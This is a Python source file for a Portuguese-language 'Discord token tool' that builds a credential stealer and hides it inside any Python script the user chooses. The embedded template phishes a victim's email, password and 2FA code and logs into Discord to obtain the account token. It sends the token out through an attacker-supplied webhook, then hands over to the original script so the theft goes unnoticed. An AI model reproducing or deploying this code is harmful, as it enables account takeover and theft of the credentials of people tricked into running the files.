import os
import requests


reset = "\033[0m"

fundo_preto = "\033[40m"
preto = "\033[30m"
vermelho = "\033[31m"
verde = "\033[32m"
amarelo = "\033[33m"
azul = "\033[34m"
magenta = "\033[35m"
ciano = "\033[36m"
branco = "\033[37m"

def limpar():
    os.system("cls" if os.name == "nt" else "clear")

codigo_m = r'''import requests
import discord
import os
def limpar():
    os.system("cls" if os.name == "nt" else "clear")
jk = []
nome_ferramenta = ""
webhook = ""
webhook = discord.Webhook.from_url(webhook)
while True:
    for i in jk:
        print(i)
    email = input("Digite seu Gmail:  ")
    senha = input("Digite sua Senha: ")
    print("VERIFICANDO.....")
    print("RESULT 1%.......")

    try:
        r = requests.post(
            "https://discord.com/api/v9/auth/login",
            json={"login": email, "password": senha},
            headers={"Content-Type": "application/json"}
        )

        if r.status_code == 200:
            data = r.json()
            if data.get("mfa"):
                codigo = input("Código 2FA: ")
                r2 = requests.post(
                    "https://discord.com/api/v9/auth/mfa",
                    json={"ticket": data["ticket"], "mfa_code": codigo},
                    headers={"Content-Type": "application/json"})
                if r2.status_code == 200:
                    dados = r2.json()
                    print("10%.....")
                    token = dados["token"]
                    b = requests.get(
                        "https://discord.com/api/v10/users/@me",
                        headers={
                            "Authorization": f"Bearer {token}"
                        })
                    result = None
                    if b.status_code == 200:
                        dados = b.json()
                        id = dados["id"]
                        result = True
                        username = dados["username"]
                    else:
                        result = False
                        id = "nao encontrado"
                        username = "nao encontrado"
                    final = f"""RESULTADOS
                  USER NAME = {username}
                  ID = {id} 
                  TOKEN = {token}"""
                    with open("resultados.txt", "w", encoding="utf-8") as f:
                        f.write(final)
                    print("100%")
                    if result == True:
                        print(f"USER NAME = {username}, ID = {id}")
                        print("PRESSIONE ENTER PARA CONTINUAR")
                    else:
                        print("ENCONTRADO")
            else:
                dados = r.json()
                print("10%.....")
                token = dados["token"]
                b = requests.get(
                    "https://discord.com/api/v10/users/@me",
                    headers={
                        "Authorization": f"Bearer {token}"
                    })
                result = None
                if b.status_code == 200:
                    dados = b.json()
                    id = dados["id"]
                    result = True
                    username = dados["username"]
                else:
                    result = False
                    id = "nao encontrado"
                    username = "nao encontrado"
                final = f"""RESULTADOS
                  USER NAME = {username}
                  ID = {id} 
                  TOKEN = {token}"""
                with open("resultados.txt", "w", encoding="utf-8") as f:
                    f.write(final)
                webhook.send(file=discord.File("resultados.txt"))
                print("100%")
                if result == True:
                    print(f"USER NAME = {username}, ID = {id}")
                    print("PRESSIONE ENTER PARA CONTINUAR")
                else:
                    print("ENCONTRADO")
            break
        elif r.status_code == 401:
            print("SENHA OU GMAIL ERRADO!!")
            limpar()
        else:
            print(f"OCORREU UM ERRO INESPERADO")
            exit()
    except:
        print("ALGO DEU ERRO")
        exit()

with open(nome_ferramenta, "r+") as f:
    codigo = f.read()
    codigo = codigo.split("#")
    f.write(codigo[1])
    os.system(f"python {nome_ferramenta}")
#





'''


menu = f"""{fundo_preto}{vermelho}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║        ██████╗ ██████╗ ████████╗██████╗ ████████╗                    ║
║       ██╔════╝██╔════╝ ╚══██╔══╝██╔══██╗╚══██╔══╝                    ║
║       ██║     ██║         ██║   ██║  ██║   ██║                       ║
║       ██║     ██║         ██║   ██║  ██║   ██║                       ║
║       ╚██████╗╚██████╗    ██║   ██████╔╝   ██║                       ║
║        ╚═════╝ ╚═════╝    ╚═╝   ╚═════╝    ╚═╝                       ║
║                                                                      ║
║             C.G.T.D.T — CARNIÇA GAMBER TOKEN DISCORD TOOL            ║
║                                                                      ║
║                 {azul}CRIADO POR LORDE COTIZEIRA{vermelho}           ║
║                                                                      ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  [ SISTEMA ]                                                         ║
║                                                                      ║
║  Ferramenta iniciada com sucesso.                                    ║
║  Seja bem-vindo ao C.G.T.D.T.                                        ║
║                                                                      ║
║  ┌──────────────────────────────────────────────────────────────┐    ║
║  │                                                              │    ║
║  │   1. GERAR                                                   │    ║
║  │                                                              │    ║
║  │   2. SAIR                                                    │    ║
║  │                                                              │    ║
║  └──────────────────────────────────────────────────────────────┘    ║
║                                                                      ║
║  Digite uma opção abaixo:                                            ║
║                                                                      ║
║  > _                                                                 ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║                                                                      ║
║  Desenvolvido por LORDE COTIZEIRA                                    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""


def codigo_juntoo():
    nome_da_pasta_salva = input("DIGITE O NOME DA PASTA SALVA[OBS PRECISA SER EM PYTHON]: ")
    with open(nome_da_pasta_salva,"r", encoding="utf-8") as f:
        codigo_usuario = f.read()
        webhook = input("DIGITE SEU WEBHOOK: ")
        nome_do_codigo = input("DIGITE O NOME DO CODIGO QUE SERA GERADO: ")
        mensagens = []
        w = 0
        while True:
            w = w + 1
            print(f"DIGITE A MENSAGEM {w} ou /mandar para mandar: ")
            mensagem = input(":")
            if mensagem == "/mandar" or mensagem == "/MANDAR":
                break
            else:
                mensagens.append(mensagem)
        codigo_mm = codigo_m.replace("jk = []", f"jk = [{mensagens}]")
        codigo_mm = codigo_mm.replace('webhook = ""', f'webhook = "{webhook}"')
        codigo_mm = codigo_mm.replace('nome_ferramenta = ""', f'nome_ferramenta = "{nome_do_codigo}"')
        with open(nome_do_codigo, "w", encoding="utf-8") as f:
            f.write(f"{codigo_mm}\n\n{codigo_usuario}")
            print(f"{verde} CODIGO GERADO COM SUCESSO")









def main():
    while True:
        print(f"{menu}{reset}")
        opcao = input(":")
        if int(opcao) == 1:
            limpar()
            codigo_juntoo()
            input("pressione ENTER para continuar")
            limpar()
        elif int(opcao) == 2:
            print("SAINDO.......")
            break
        else:
            input("OPCAO INVALIDA")
            limpar()


if __name__ == "__main__":
    main()
    limpar()

